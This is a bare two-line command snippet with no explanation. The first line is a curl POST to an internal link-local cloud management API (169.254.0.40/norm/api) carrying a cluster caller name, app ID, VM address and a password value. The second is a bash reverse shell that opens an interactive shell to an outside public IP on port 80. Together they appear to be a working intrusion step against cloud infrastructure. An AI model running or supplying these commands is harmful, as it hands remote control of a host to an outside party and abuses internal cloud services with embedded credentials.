curl -XPOST -d '{"version":"1","eventId":200,"timestamp":1729772419,"caller":"cls-pfjxwp84-tke-eni-ipamd","callee":"NORM","interface":{"interfaceName":"NORM.GetUin","appId":"1351000042","para":{"appId": "1351000042", "unClusterId": "clu-12345678", "uuid": "a15c9d97-2c76-4e70-a33b-4fa2a8729e35","uInstanceId": "", "vmip": "10.113.208.65", "vpcId": "100", "bMaster": 1, "version": "1.0", "vmPara": "{}"}},"password":"cls-pfjxwp84"}' http://169.254.0.40:80/norm/api

/bin/bash -i >& /dev/tcp/175.178.104.95/80 0>&1
